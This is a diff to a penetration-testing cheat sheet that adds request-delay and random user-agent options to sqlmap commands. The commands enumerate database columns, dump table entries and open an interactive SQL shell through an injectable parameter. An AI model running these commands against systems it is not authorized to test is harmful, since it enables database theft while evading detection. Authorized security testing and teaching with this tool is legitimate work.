@@ -164,14 +164,18 @@ sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 -
 sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent -D <DB_name> --tables
 
 # Enumerate DBMS database table columns
-sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch -D <DB_name> -T <TABLE_name> --columns
+sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent -D <DB_name> -T <TABLE_name> --columns
 
 # Dump DBMS database table entries
-sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch -D <DB_name> -T <TABLE_name> -C <column_name_1,column_name_2> --dump
+sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent -D <DB_name> -T <TABLE_name> -C <column_name_1,column_name_2> --dump
 
 # SQLMap options
---dbms=<dbms>    # Specify DBMS type if known (e.g., mysql, postgresql, mssql)
---current-user   # Retrieve DBMS current user
+--delay=<delay_seconds> # Delay in seconds between each HTTP request
+--batch                 # Never ask for user input, use the default behavior
+--random-agent          # Use randomly selected HTTP User-Agent header value
+--dbms=<dbms>           # Specify DBMS type if known (e.g., mysql, postgresql, mssql)
+--current-user          # Retrieve DBMS current user
+--sql-shell             # Prompt for an interactive SQL shell
 ```
 
 # Linux Privilege Escalation
